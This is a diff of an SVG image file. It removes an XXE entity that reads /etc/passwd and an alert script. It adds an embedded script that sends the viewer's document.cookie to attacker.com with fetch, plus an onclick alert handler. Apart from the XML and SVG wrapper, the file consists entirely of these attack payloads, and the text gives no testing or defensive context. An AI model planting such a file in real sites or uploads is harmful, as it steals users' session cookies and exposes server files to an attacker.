@@ -1,9 +1,11 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
-  <text x="10" y="20">&xxe;</text>
-<script>alert(1)</script>
-
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
+  <script type="text/javascript">
+    <![CDATA[
+      alert("XSS via SVG");
+      // Exfiltrate data to attacker's server
+      fetch("https://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie));
+    ]]>
+  </script>
+  <rect width="100" height="100" fill="red" onclick="alert('Click XSS')"/>
 </svg>
